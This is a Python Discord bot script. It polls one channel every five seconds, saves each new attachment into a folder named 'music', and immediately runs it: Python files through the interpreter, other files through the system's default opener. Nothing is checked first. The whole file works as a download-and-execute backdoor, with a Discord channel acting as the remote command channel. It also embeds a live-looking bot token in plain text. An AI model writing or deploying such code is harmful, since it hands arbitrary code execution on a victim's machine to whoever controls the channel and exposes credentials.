import discord
import aiohttp
import os
import asyncio
import subprocess
import sys

TOKEN = "MTMzMjkxMTMxODA4ODU1MjUyMQ.GYgD9H._QxE1xZw7-iDbZfc83GkTPVpbYyknUeJ7tRudE"
CHANNEL_ID = 1423680690280730726
DOWNLOAD_FOLDER = "music"

intents = discord.Intents.default()
client = discord.Client(intents=intents)

os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

downloaded_attachments = set()

async def download_file(msg, attachment, channel):
    outpath = os.path.join(DOWNLOAD_FOLDER, attachment.filename)

    async with aiohttp.ClientSession() as session:
        async with session.get(attachment.url) as resp:
            with open(outpath, "wb") as f:
                while True:
                    chunk = await resp.content.read(8192)
                    if not chunk:
                        break
                    f.write(chunk)

    print(f"✅ Downloaded {attachment.filename}")
    await channel.send(f"✅ Downloaded `{attachment.filename}`")

    run_file(outpath, channel)


def run_file(filepath, channel):
    """Run the downloaded file depending on its extension."""
    try:
        ext = os.path.splitext(filepath)[1].lower()

        if ext == ".py":
            subprocess.Popen([sys.executable, filepath], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif os.name == "nt":
            os.startfile(filepath)
        else:
            subprocess.Popen(["xdg-open", filepath])

        print(f"🚀 Launched {filepath}")

    except Exception as e:
        print(f"❌ Error running {filepath}: {e}")


async def background_task():
    await client.wait_until_ready()
    channel = client.get_channel(CHANNEL_ID)
    if channel is None:
        channel = await client.fetch_channel(CHANNEL_ID)

    print(f"📂 Monitoring #{channel.name} (ID: {channel.id})")

    while not client.is_closed():
        async for msg in channel.history(limit=30):  # check last 30 messages
            for attachment in msg.attachments:
                if attachment.id not in downloaded_attachments:
                    downloaded_attachments.add(attachment.id)
                    await download_file(msg, attachment, channel)

        await asyncio.sleep(5)  # check every 5 seconds


@client.event
async def on_ready():
    print(f"✅ Bot logged in as {client.user}")
    client.loop.create_task(background_task())


client.run(TOKEN)
